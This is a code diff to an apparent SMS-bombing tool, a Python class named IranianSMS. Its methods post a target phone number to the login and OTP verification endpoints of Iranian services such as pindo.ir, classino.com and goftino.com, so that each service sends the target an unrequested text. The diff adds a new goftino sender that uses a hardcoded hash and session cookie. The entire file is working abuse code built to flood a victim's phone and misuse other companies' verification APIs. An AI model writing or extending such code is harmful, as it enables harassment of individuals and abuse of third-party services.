@@ -509,7 +509,7 @@ class IranianSMS:
             return True
         
     def pindo(self) -> Literal[True]:
-        '''Sends SMS using lendoco.ir verification api'''
+        '''Sends SMS using pindo.ir verification api'''
         pindo_URL: str = r"https://api.pindo.ir/v1/user/login-register/"
         
         try:
@@ -524,12 +524,12 @@ class IranianSMS:
         else:
             return True  
     
-    def threetex(self) -> Literal[True]:
-        '''Sends SMS using 3tex.io verification api'''
-        threetex_url: str = r"https://3tex.io/api/1/users/validation/mobile"
-
+    def classino(self) -> Literal[True]:
+        '''Sends SMS using classino.com verification api'''
+        classino_URL: str = r"https://student.classino.com/otp/v1/api/login"
+        
         try:
-            result: Response = post(threetex_url, headers=Headers.threetex_header, json={'receptorPhone': self.PhoneNumber}) 
+            result: Response = post(classino_URL, headers=Headers.classino_header, json={'mobile': self.PhoneNumber}) 
             # ===== # Handling possible error # ===== #
             if(400 <= result.status_code <= 499):
                 raise bomb_exceptions.BombClientError
@@ -539,3 +539,26 @@ class IranianSMS:
             raise ConnectionError
         else:
             return True
+    
+    def goftino(self) -> Literal[True]:
+        '''Sends SMS using goftino.com verification api'''
+        goftino_URL: str = r"https://my.goftino.com/action/request_verify_tel"
+        
+        data = {
+            'tel': self.PhoneNumber,
+            'hash': 'b7331a9db13150b6c415239f1d32158c2bda9a2f',}
+        
+        cookies = {
+            'goftinoSession': 's%3AFxCYR7MkUkquPFPdZ7dhDo2QykDa4k4e.qC7l9uOustr1mO4FCGyYrxArnjipoXwUibkmUIKIblk',}
+        try:
+            result: Response = post(goftino_URL, headers=Headers.goftino_header, cookies=cookies, data=data) 
+            # ===== # Handling possible error # ===== #
+            if(400 <= result.status_code <= 499):
+                raise bomb_exceptions.BombClientError
+            elif(500 <= result.status_code <= 599):
+                raise bomb_exceptions.BombClientError
+        except exceptions.ConnectionError:
+            raise ConnectionError
+        else:
+            return True
+    
